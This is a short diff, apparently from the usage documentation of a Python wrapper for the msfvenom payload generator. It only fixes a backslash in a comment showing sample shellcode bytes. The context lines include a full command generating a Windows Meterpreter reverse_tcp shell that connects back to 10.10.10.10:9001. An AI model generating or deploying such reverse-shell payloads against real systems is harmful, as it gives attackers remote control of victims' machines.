@@ -137,7 +137,7 @@ msf = msf_shellcode()
 # Run custom MsfVenom command and get the shellcode back
 # No need to specify the 'msfvenom' word
 shellcode = msf.run_msfvenom_command('-p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001 EXITFUNC=thread -f python')
-# shellcode = xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b...
+# shellcode = \xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b...
 
 # Use predefined functions for fasten the developement
 # Keyword arguments are enabled.
